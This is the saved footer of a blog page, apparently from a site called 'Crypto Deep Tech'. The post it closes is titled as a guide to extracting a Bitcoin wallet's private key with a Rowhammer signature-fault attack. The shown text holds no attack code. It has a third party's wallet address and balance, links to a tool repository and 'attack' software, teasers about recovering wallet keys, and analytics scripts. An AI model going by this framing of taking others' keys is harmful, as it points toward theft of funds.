<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-191-1024x450.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1363"><figcaption><strong><a href="https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 683.49</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/15RowhammerAttack" target="_blank" rel="noreferrer noopener">Source</a></strong></p>



<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">ATTACKSAFE SOFTWARE</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><a href="https://youtu.be/lfYPcXPzLjE" target="_blank" rel="noreferrer noopener"><strong>Video: https://youtu.be/lfYPcXPzLjE</strong></a></p>



<p><strong><a href="https://cryptodeeptech.ru/rowhammer-attack" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/rowhammer-attack</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/019-1-1024x576.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1122"></figure></div>


<p></p>
	</div><!-- .entry-content -->

	<footer class="entry-footer">
		<div class="cat-links"><i class="fa fa-folder-open" aria-hidden="true"></i> <a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a></div>	</footer><!-- .entry-footer -->
</article><!-- #post-650 -->

	<nav class="navigation post-navigation" aria-label="Записи">
		<h2 class="screen-reader-text">Навигация по записям</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://cryptodeeptech.ru/history/" rel="prev">Historical background regarding Bitcoin Wallet Hacks</a></div></div>
	</nav>		<div id="itng_related_posts_wrapper">
			<h3 id="itng_related_posts_title">Related Posts</h3>
			<div class="itng-related-posts row">
				<article id="post-505" class="itng-blog col-md-6 col-lg-4 post-505 post type-post status-publish format-standard hentry category-cryptanalysis">
		<div class="itng-card-wrapper">
			<div class="itng-thumb">
							</div>
			
			<div class="itng-card-content">
				<div class="entry-meta">
					<a href="https://cryptodeeptech.ru/coingecko-agent-ftpupload/"></a>
					<span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>				</div><!-- .entry-meta -->
				
				<header class="entry-header">
					<h2 class="entry-title"><a href="https://cryptodeeptech.ru/coingecko-agent-ftpupload/">Coingecko &amp; Agent Ftpupload create beautiful crypto wallet addresses, but keep the private key safe</a></h2>				</header><!-- .entry-header -->
				
				<div class="itng_excerpt">
					Over the years, a whole cult has formed in the crypto community to create beautiful addresses for crypto wallets.&nbsp;Everyone can generate a "beautiful" address for themselves, which will not only be unique, but will also contain a certain combination of letters and numbers.&nbsp;This is a very exciting and interesting process, but the risk associated with involving a…				</div>
				
				<div class="blog-footer">
					<div class="itng_cats">
						<a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a>					</div>
					<div class="blog-comments">
						0					</div>
				</div>
			</div>
		</div>
</article><!-- #post-505 --><article id="post-337" class="itng-blog col-md-6 col-lg-4 post-337 post type-post status-publish format-standard hentry category-cryptanalysis">
		<div class="itng-card-wrapper">
			<div class="itng-thumb">
							</div>
			
			<div class="itng-card-content">
				<div class="entry-meta">
					<a href="https://cryptodeeptech.ru/endomorphism/"></a>
					<span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>				</div><!-- .entry-meta -->
				
				<header class="entry-header">
					<h2 class="entry-title"><a href="https://cryptodeeptech.ru/endomorphism/">Speed ​​up secp256k1 with endomorphism</a></h2>				</header><!-- .entry-header -->
				
				<div class="itng_excerpt">
					In this article, we will look&nbsp;&nbsp;secp256k1&nbsp;at the endomorphism acceleration function that helps in optimizing the validation&nbsp;&nbsp;ECDSA&nbsp;for the Bitcoin cryptocurrency, but first, a little history. 12 января 2009 года&nbsp;Satoshi Nakamoto sent&nbsp;Hal Finney&nbsp;&nbsp;&nbsp;in the earliest bitcoin transactions&nbsp;&nbsp;10 BTC. That Satoshi Nakamoto chose Hal as the first recipient of Bitcoins is not surprising.&nbsp;Satoshi had great respect for Hal, who established…				</div>
				
				<div class="blog-footer">
					<div class="itng_cats">
						<a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a>					</div>
					<div class="blog-comments">
						0					</div>
				</div>
			</div>
		</div>
</article><!-- #post-337 --><article id="post-463" class="itng-blog col-md-6 col-lg-4 post-463 post type-post status-publish format-standard hentry category-cryptanalysis">
		<div class="itng-card-wrapper">
			<div class="itng-thumb">
							</div>
			
			<div class="itng-card-content">
				<div class="entry-meta">
					<a href="https://cryptodeeptech.ru/mr-robot-qr/"></a>
					<span class="byline"> <span class="author vcard"><a class="url fn n" href="https://cryptodeeptech.ru/author/cryptodeeptech/">Crypto Deep Tech</a></span></span>				</div><!-- .entry-meta -->
				
				<header class="entry-header">
					<h2 class="entry-title"><a href="https://cryptodeeptech.ru/mr-robot-qr/">MrRobotQR scan QR codes from search engines in search of private keys of Bitcoin Wallets</a></h2>				</header><!-- .entry-header -->
				
				<div class="itng_excerpt">
					We all know the phrase:&nbsp;&nbsp;"Everything that gets on the Internet, remains in it forever and becomes publicly available." Down to hidden content. The&nbsp;&nbsp;2021 году&nbsp;pandemic brought back popularity&nbsp;&nbsp;QR-кодов.&nbsp;For&nbsp; the first time&nbsp;QR-коды&nbsp;they were used in production in&nbsp;&nbsp;1994 году&nbsp;a subsidiary&nbsp;&nbsp;Toyota&nbsp;in Japan and introduced them at an assembly plant to control produced cars and parts for them.&nbsp;Unlike a barcode,&nbsp;&nbsp;QR-код&nbsp;it contains more…				</div>
				
				<div class="blog-footer">
					<div class="itng_cats">
						<a href="https://cryptodeeptech.ru/category/cryptanalysis/" rel="category tag">Cryptanalysis</a>					</div>
					<div class="blog-comments">
						0					</div>
				</div>
			</div>
		</div>
</article><!-- #post-463 -->			</div>
		</div>
			<div id="author_box" class="row no-gutters">
			<div class="author_avatar col-2">
							</div>
			<div class="author_info col-10">
				<h4 class="author_name title-font">
					Crypto Deep Tech				</h4>
				<div class="author_bio">
									</div>
			</div>
		</div>
	
	</main><!-- #main -->

<!--WCLEARFY_PAGE_TYPE_post--><!--WCLEARFY_FOOTER_START--></div><!-- #content-wrapper -->


 <div id="footer-sidebar" class="widget-area">
    <div class="container">
        <div class="row">
                    </div>
    </div>
</div>
	<footer id="colophon" class="site-footer">
		<div class="container">
			<div class="site-info">
				Donation Address: <a href="https://www.blockchain.com/btc/address/1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v" target="_blank">♥  BTC: 1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v</a>				<span class="sep"> | </span>
					Copyright © 2022 «CRYPTO DEEP TECH». 			</div><!-- .site-info -->
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<nav id="menu" class="panel" role="navigation" style="position: fixed; top: 0px; bottom: 0px; height: 100%; left: -15.625em; width: 15.625em;">
	<div class="menu-overlay"></div>
	<div id="panel-top-bar">
		<button class="go-to-bottom"></button>
		<button id="close-menu" class="menu-link"><i class="fa fa-chevron-left" aria-hidden="true"></i></button>
	</div>

	<ul id="menu-main" class="menu"><li id="menu-item-229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home"><a href="https://cryptodeeptech.ru/">HOME</a></li>
<li id="menu-item-225" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/publication/">PUBLICATIONS</a></li>
<li id="menu-item-226" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/study/">STUDY</a></li>
<li id="menu-item-227" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/resources/">RESOURCES</a></li>
<li id="menu-item-228" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/contacts/">CONTACTS</a></li>
<li id="menu-item-240" class="menu-item menu-item-type-post_type menu-item-object-post"><a href="https://cryptodeeptech.ru/lattice-attack/">BLOG</a></li>
<li id="menu-item-541" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/eng/">ENG</a></li>
<li id="menu-item-542" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://cryptodeeptech.ru/rus/">RUS</a></li>
</ul>
	<button class="go-to-top"></button>
</nav>

<div id="sticky-navigation">
	<div class="nav-wrapper">
		 <div class="container">

			 <div class="row justify-content-end align-items-center justify-content-between no-gutters">


				<div class="main-navigation col-lg-9" role="navigation">
					<ul id="menu-desktop" class="menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-229"><a href="https://cryptodeeptech.ru/">HOME</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-225"><a href="https://cryptodeeptech.ru/publication/">PUBLICATIONS</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-226"><a href="https://cryptodeeptech.ru/study/">STUDY</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-227"><a href="https://cryptodeeptech.ru/resources/">RESOURCES</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-228"><a href="https://cryptodeeptech.ru/contacts/">CONTACTS</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-240"><a href="https://cryptodeeptech.ru/lattice-attack/">BLOG</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-541"><a href="https://cryptodeeptech.ru/eng/">ENG</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-542"><a href="https://cryptodeeptech.ru/rus/">RUS</a></li>
</ul>				</div>

				<button href="#menu" class="menu-link mobile-nav-btn"><i class="fa fa-bars" aria-hidden="true"></i></button>

				<button type="button" id="go-to-field" tabindex="-1"></button>

				<button class="search-btn-sticky ml-auto col-auto"><i class="fa fa-search"></i></button>
				
<div class="itng-search-sticky">
	<form role="search" method="get" class="search-form" action="https://cryptodeeptech.ru/">
				<label>
					<span class="screen-reader-text">Найти:</span>
					<input type="search" class="search-field" placeholder="Поиск…" value="" name="s">
				</label>
				<input type="submit" class="search-submit" value="Поиск">
			</form>	<button type="button" id="go-to-btn" tabindex="-1"></button>
</div>

			</div>
		</div>
	</div>
</div>

<div id="itng-back-to-top" class="show"><i class="fa fa-chevron-up" aria-hidden="true"></i></div>

		<script type="text/javascript">
							jQuery("#post-650 .entry-meta .date").css("display","none");
					jQuery("#post-650 .entry-date").css("display","none");
					jQuery("#post-650 .posted-on").css("display","none");
							jQuery("#post-505 .entry-meta .date").css("display","none");
					jQuery("#post-505 .entry-date").css("display","none");
					jQuery("#post-505 .posted-on").css("display","none");
							jQuery("#post-337 .entry-meta .date").css("display","none");
					jQuery("#post-337 .entry-date").css("display","none");
					jQuery("#post-337 .posted-on").css("display","none");
							jQuery("#post-463 .entry-meta .date").css("display","none");
					jQuery("#post-463 .entry-date").css("display","none");
					jQuery("#post-463 .posted-on").css("display","none");
				</script>
	<script src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_2b1ae4cca3cc8d12c39be42768565308.js" id="big-slide-js"></script>
<script src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_ccdf893e7d8b26933af0c336bcc3943e.js" id="owl-js-js"></script>
<script src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/jquery.magnific-popup.min.js" id="mag-lightbox-js-js"></script>
<script id="itng-custom-js-js-extra">
var itng = {"toTopEnable":"1","stickyNav":""};
</script>
<script src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_ea8874ba65dbd53bf5c7fb5c619ac579.js" id="itng-custom-js-js"></script>
<script src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_6ec0e9b3201c83a442e24aba829a5f05.js" id="itng-navigation-js"></script>
<!-- Yandex.Metrika counter --> <script type="text/javascript"> (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(89424273, "init", {  id:89424273, clickmap:true, trackLinks:true, webvisor:true, accurateTrackBounce:true }); </script> <noscript><div><img src="https://mc.yandex.ru/watch/89424273" style="position:absolute; left:-9999px;" alt="" /></div></noscript> <!-- /Yandex.Metrika counter -->
<!-- Yandex.Metrika counter -->
<script type="text/javascript">
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   var z = null;m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(89995532, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/89995532" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->


</body></html>